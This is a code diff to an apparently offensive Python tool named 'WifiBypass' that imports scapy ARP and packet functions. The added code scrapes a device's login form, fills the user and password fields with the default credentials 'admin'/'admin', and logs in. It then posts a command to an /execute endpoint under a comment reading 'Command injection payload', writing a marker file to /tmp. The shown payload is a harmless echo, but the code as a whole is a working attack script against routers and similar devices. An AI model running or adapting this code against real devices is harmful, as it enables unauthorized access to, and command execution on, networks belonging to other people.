@@ -3,6 +3,8 @@ import signal
 import threading
 import time
 import requests
+from bs4 import BeautifulSoup
+import re
 from scapy.all import ARP, Ether, IP, TCP, send, sniff, sr1
 
 class WifiBypass:
@@ -134,11 +136,33 @@ class WifiBypass:
         try:
             session = requests.Session()
             login_url = f"http://{ip}/login"
-            login_data = {"username": "admin", "password": "admin"}
+            login_page = session.get(login_url)
+
+ 
+            soup = BeautifulSoup(login_page.text, 'html.parser')
+            form = soup.find('form')
+            if not form:
+                print("[ERROR] No login form found")
+                return
+
+            login_data = {}
+            user_regex = re.compile(r'user|login|name', re.I)
+            pass_regex = re.compile(r'pass|pwd', re.I)
+
+            for input_tag in form.find_all('input'):
+                input_name = input_tag.get('name')
+                if input_name:
+                    if user_regex.search(input_name):
+                        login_data[input_name] = "admin"
+                    elif pass_regex.search(input_name):
+                        login_data[input_name] = "admin"
+
             login_response = session.post(login_url, data=login_data)
 
             if "Welcome" in login_response.text or login_response.status_code == 200:
                 print("[INFO] Login admin retrieved [+]")
+
+                # Command injection payload
                 payload_url = f"http://{ip}/execute"
                 payload_data = {"cmd": "echo 'Gabriel Attack successful' > /tmp/gabriel.txt"}
                 payload_response = session.post(payload_url, data=payload_data)
@@ -175,6 +199,4 @@ if __name__ == '__main__':
         threading.Thread(target=bypass.start).start()
     else:
         print("No interfaces found. Exiting...")
-
-
 
